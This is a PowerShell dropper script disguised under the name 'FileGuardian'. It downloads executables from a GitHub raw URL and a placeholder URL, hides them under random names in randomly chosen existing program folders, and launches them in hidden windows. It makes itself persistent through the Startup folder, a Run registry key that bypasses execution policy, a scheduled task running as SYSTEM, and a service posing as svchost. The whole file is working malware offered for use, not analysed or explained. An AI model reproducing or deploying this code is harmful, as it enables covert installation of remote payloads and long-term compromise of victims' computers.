# 📌 Variables:
$FileURL       = "https://raw.githubusercontent.com/wetiee/oculushelp/main/rapid.exe"
$AdditionalFileURL = "https://raw.githubusercontent.com/wetiee/oculushelp/main/rust_gui.exe" 
$LaunchDelay   = 10  # Set the delay to 30 seconds
$WindowStyle   = "Hidden"

$StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileGuardian.ps1"
$StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$TaskName       = "FileGuardianTask"
$TaskPath       = "C:\Windows\System32\Tasks\FileGuardianTask.xml"
$ServiceName    = "FileGuardianService"

# 📌 Function: Set persistence via Startup folder, Registry, and Service
function Set-Persistence {
    try {
        # Copy this script to Startup folder
        if (-not (Test-Path $StartupScriptPath)) {
            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
        }

        # Add Registry Run key for persistence
        $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        Set-ItemProperty -Path $StartupRegPath -Name "FileGuardian" -Value $command -Force

        # Create a scheduled task for persistence
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force

        # Create a Windows service for persistence
        $servicePath = "$env:SystemRoot\System32\svchost.exe"
        $serviceArgs = "-k netsvcs -p -s $ServiceName"
        $service = New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description "File Guardian Service"
        Start-Service -Name $ServiceName

        Write-Host "[+] Persistence established."
    }
    catch {
        Write-Host "[!] Failed to set persistence: $_"
    }
}

# 📌 Function: Download & Run file (always run, download if missing)
function Run-Payload {
    try {
        # Define possible staging directories
        $possibleDirectories = @(
            "$env:ProgramFiles(x86)",
            "$env:ProgramFiles",
            "$env:APPDATA",
            "$env:LOCALAPPDATA"
        )

        # Randomly select a directory
        $selectedDirectory = $possibleDirectories | Get-Random

        # Ensure the selected directory exists
        if (-not (Test-Path $selectedDirectory)) {
            throw "Selected directory does not exist: $selectedDirectory"
        }

        # Find a subdirectory within the selected directory that already exists
        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
        if ($subDirectories.Count -eq 0) {
            throw "No subdirectories found in the selected directory: $selectedDirectory"
        }

        $targetSubDirectory = $subDirectories | Get-Random
        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "katysaneur.exe"

        if (-not (Test-Path $TargetPath)) {
            Write-Host "[*] File not found — downloading..."
            Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
        }

        Start-Sleep -Seconds $LaunchDelay  # Delay the launch by 30 seconds

        # Execute downloaded file hidden
        Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle

        Write-Host "[+] Executed: $TargetPath"

        # Additional file execution
        $AdditionalTargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "another.exe"
        if (-not (Test-Path $AdditionalTargetPath)) {
            Write-Host "[*] Additional file not found — downloading..."
            Invoke-WebRequest -Uri $AdditionalFileURL -OutFile $AdditionalTargetPath
        }

        # Execute additional downloaded file hidden immediately
        Start-Process -FilePath $AdditionalTargetPath -WindowStyle $WindowStyle

        Write-Host "[+] Executed: $AdditionalTargetPath"
    }
    catch {
        Write-Host "[!] Failed to download or launch file: $_"
    }
}

# 📌 Main execution:
# Instantly download and launch a new file
$InstantFileURL = "https://example.com/path/to/instantfile.exe"
$InstantTargetPath = Join-Path -Path $env:TEMP -ChildPath "instantfile.exe"
if (-not (Test-Path $InstantTargetPath)) {
    Write-Host "[*] Instant file not found — downloading..."
    Invoke-WebRequest -Uri $InstantFileURL -OutFile $InstantTargetPath
}
Start-Process -FilePath $InstantTargetPath -WindowStyle $WindowStyle

Set-Persistence
Run-Payload